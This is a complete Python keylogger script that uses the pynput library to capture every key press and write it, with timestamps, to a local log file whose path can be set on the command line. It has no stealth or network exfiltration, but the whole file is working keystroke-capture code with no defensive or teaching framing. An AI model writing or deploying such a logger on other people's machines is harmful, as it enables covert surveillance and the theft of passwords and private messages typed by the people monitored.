#!/usr/bin/env python3

import sys
import signal
import logging
from pynput import keyboard


DEFAULT_LOGFILE = r"./keylog.log"


def fail(reason, exit_code=1):
    print(f"Error: {reason.capitalize()}", file=sys.stderr)
    sys.exit(exit_code)


if len(sys.argv) > 1:
    logfile = " ".join(sys.argv[1:])
else:
    logfile = DEFAULT_LOGFILE


try:
    open(logfile, "w").close()
except PermissionError:
    fail("you do not have permission to create or write to the logfile")
except FileNotFoundError:
    fail("the path to the logfile is invalid or does not exist")
except:
    fail("unknown error occured while opening the logfile")


logging.basicConfig(
    level = logging.INFO,
    format = "[%(asctime)s] %(message)s",
    filename = logfile,
)


def exit_handler(signum, frame):
    listener.stop()

signal.signal(signal.SIGINT, exit_handler)
signal.signal(signal.SIGTERM, exit_handler)


with keyboard.Listener(on_press=logging.info) as listener:
    listener.join()

